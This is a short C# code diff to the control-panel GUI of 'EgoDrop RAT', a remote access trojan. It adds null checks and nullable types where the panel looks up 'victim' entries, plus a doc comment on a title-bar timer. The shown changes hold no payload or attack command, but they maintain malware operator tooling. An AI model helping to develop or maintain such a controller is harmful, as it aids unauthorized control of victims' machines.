@@ -469,8 +469,11 @@ namespace EgoDrop
 
                         if (nCode == 1)
                         {
-                            NetworkNode node = networkView1.FindNodeWithID(szSrcVictimID);
-                            ListViewItem item = listView1.FindItemWithText(szSrcVictimID, true, 0);
+                            NetworkNode? node = networkView1.FindNodeWithID(szSrcVictimID);
+                            if (node == null)
+                                return;
+
+                            ListViewItem? item = listView1.FindItemWithText(szSrcVictimID, true, 0);
 
                             if (item == null)
                                 return;
@@ -560,7 +563,7 @@ namespace EgoDrop
         /// <param name="vic">Victim object.</param>
         public void fnOnVictimDisconnected(clsListener ltn, clsVictim vic, string szVictimID)
         {
-            TreeNode fnFindNode(string szID, TreeNode nodeParent = null)
+            TreeNode? fnFindNode(string szID, TreeNode? nodeParent = null)
             {
                 foreach (TreeNode node in nodeParent == null ? treeView2.Nodes : nodeParent.Nodes)
                 {
@@ -1305,6 +1308,11 @@ namespace EgoDrop
             networkView1.DisplayProtocol = toolStripButton3.Checked;
         }
 
+        /// <summary>
+        /// Update current state.
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
         private void timer1_Tick(object sender, EventArgs e)
         {
             Text = $"EgoDrop RAT {m_szVersion} (by. ISSAC/iss4cf0ng) | " +
